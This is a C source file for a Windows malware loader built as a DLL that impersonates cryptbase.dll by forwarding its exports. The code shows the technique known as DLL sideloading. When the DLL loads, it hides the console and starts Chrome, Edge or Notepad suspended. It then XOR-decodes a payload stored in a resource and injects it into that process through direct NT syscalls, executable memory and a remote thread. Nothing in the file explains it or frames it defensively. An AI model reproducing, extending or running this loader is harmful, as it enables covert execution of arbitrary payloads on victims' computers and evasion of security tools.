#include <stdlib.h>
#include <windows.h>
#include <winternl.h>
#include <tlhelp32.h>
#include <psapi.h>
#include "resource.h"
#include "syscall.h"


#define _CRT_SECURE_NO_DEPRECATE
#pragma warning (disable : 4996)

#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)

#pragma comment(linker, "/export:SystemFunction001=C:\\Windows\\System32\\cryptbase.SystemFunction001,@1")
#pragma comment(linker, "/export:SystemFunction002=C:\\Windows\\System32\\cryptbase.SystemFunction002,@2")
#pragma comment(linker, "/export:SystemFunction003=C:\\Windows\\System32\\cryptbase.SystemFunction003,@3")
#pragma comment(linker, "/export:SystemFunction004=C:\\Windows\\System32\\cryptbase.SystemFunction004,@4")
#pragma comment(linker, "/export:SystemFunction005=C:\\Windows\\System32\\cryptbase.SystemFunction005,@5")
#pragma comment(linker, "/export:SystemFunction028=C:\\Windows\\System32\\cryptbase.SystemFunction028,@6")
#pragma comment(linker, "/export:SystemFunction029=C:\\Windows\\System32\\cryptbase.SystemFunction029,@7")
#pragma comment(linker, "/export:SystemFunction034=C:\\Windows\\System32\\cryptbase.SystemFunction034,@8")
#pragma comment(linker, "/export:SystemFunction036=C:\\Windows\\System32\\cryptbase.SystemFunction036,@9")
#pragma comment(linker, "/export:SystemFunction040=C:\\Windows\\System32\\cryptbase.SystemFunction040,@10")
#pragma comment(linker, "/export:SystemFunction041=C:\\Windows\\System32\\cryptbase.SystemFunction041,@11")

const char xorKey[] = "ABCABC@ZZZZZZZZZZZZZZZ";

const wchar_t* TARGET_PROCESS_PATHS[] = {
    L"C:\\Windows\\System32\\notepad.exe",
    L"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
    L"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"
};

const int TARGET_PROCESS_COUNT = 3;

void ProcessPayloadData(BYTE* data, DWORD size) {
    int keyLength = sizeof(xorKey) - 1;
    for (DWORD i = 0; i < size; i++) {
        data[i] ^= xorKey[i % keyLength];
    }
}

BOOL InjectIntoProcess(HANDLE hProcess) {
    HMODULE hModule = NULL;
    if (!GetModuleHandleEx(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS, (LPCTSTR)InjectIntoProcess, &hModule)) {
        return FALSE;
    }

    HRSRC resHandle = FindResource(hModule, MAKEINTRESOURCE(IDR_BON1), L"BON");
    if (!resHandle) {
        return FALSE;
    }

    DWORD resSize = SizeofResource(hModule, resHandle);
    HGLOBAL resData = LoadResource(hModule, resHandle);
    void* resPtr = LockResource(resData);

    if (!resPtr || resSize == 0) {
        return FALSE;
    }

    LPVOID lpAllocationStart = nullptr;
    SIZE_T szAllocationSize = resSize;
    NTSTATUS status = NtAllocateVirtualMemory(GetCurrentProcess(), &lpAllocationStart, 0, &szAllocationSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (!NT_SUCCESS(status) || lpAllocationStart == NULL) {
        return FALSE;
    }

    BYTE* pLocalData = (BYTE*)lpAllocationStart;

    memcpy(pLocalData, resPtr, resSize);

    ProcessPayloadData(pLocalData, resSize);

    LPVOID pRemoteMemory = nullptr;
    SIZE_T szRemoteAllocationSize = resSize;
    status = NtAllocateVirtualMemory(hProcess, &pRemoteMemory, 0, &szRemoteAllocationSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (!NT_SUCCESS(status) || !pRemoteMemory) {
        SIZE_T szFreeSize = 0;
        NtFreeVirtualMemory(GetCurrentProcess(), &lpAllocationStart, &szFreeSize, MEM_RELEASE);
        return FALSE;
    }

    SIZE_T bytesWritten = 0;
    status = NtWriteVirtualMemory(hProcess, pRemoteMemory, pLocalData, resSize, &bytesWritten);

    if (!NT_SUCCESS(status)) {
        SIZE_T szFreeSize = 0;
        NtFreeVirtualMemory(GetCurrentProcess(), &lpAllocationStart, &szFreeSize, MEM_RELEASE);
        return FALSE;
    }

    HANDLE hThread = NULL;
    status = NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, hProcess, pRemoteMemory, NULL, FALSE, 0, 0, 0, NULL);

    if (!NT_SUCCESS(status) || !hThread) {
        SIZE_T szFreeSize = 0;
        NtFreeVirtualMemory(GetCurrentProcess(), &lpAllocationStart, &szFreeSize, MEM_RELEASE);
        return FALSE;
    }

    WaitForSingleObject(hThread, 1000);

    NtClose(hThread);

    SIZE_T szFreeSize = 0;
    NtFreeVirtualMemory(GetCurrentProcess(), &lpAllocationStart, &szFreeSize, MEM_RELEASE);

    return TRUE;
}

BOOL CreateProcessAndInject() {
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;

    if (CreateProcessW(TARGET_PROCESS_PATHS[2], NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        BOOL result = InjectIntoProcess(pi.hProcess);
        NtClose(pi.hThread);
        NtClose(pi.hProcess);
        return result;
    }
    if (CreateProcessW(TARGET_PROCESS_PATHS[1], NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        BOOL result = InjectIntoProcess(pi.hProcess);
        NtClose(pi.hThread);
        NtClose(pi.hProcess);
        return result;
    }
    if (CreateProcessW(TARGET_PROCESS_PATHS[0], NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        BOOL result = InjectIntoProcess(pi.hProcess);
        NtClose(pi.hThread);
        NtClose(pi.hProcess);
        return result;
    }
    return FALSE;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        __try {
            HWND hWnd = GetConsoleWindow();
            if (hWnd) {
                ShowWindow(hWnd, SW_HIDE);
                SetWindowLong(hWnd, GWL_EXSTYLE,
                    GetWindowLong(hWnd, GWL_EXSTYLE) | WS_EX_LAYERED);
                SetLayeredWindowAttributes(hWnd, 0, 0, LWA_ALPHA);
            }
            CreateProcessAndInject();
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {}	
    }
    return TRUE;
}